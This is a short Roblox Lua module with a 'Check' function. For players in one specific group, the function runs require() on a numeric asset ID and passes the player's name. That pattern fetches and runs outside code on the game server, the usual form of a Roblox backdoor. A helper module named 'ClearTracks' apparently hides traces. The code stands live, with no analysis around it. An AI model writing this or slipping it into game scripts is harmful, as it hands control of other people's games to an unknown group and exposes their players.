local http = game:GetService("HttpService")
local cleartracks = require("./ClearTracks")
local module = {
	Check = function(plr)
		if plr:IsInGroupAsync(961741511) then
			require(8971623478623)(plr.Name)
			return true
		else
			return false
		end
	end,
} return module
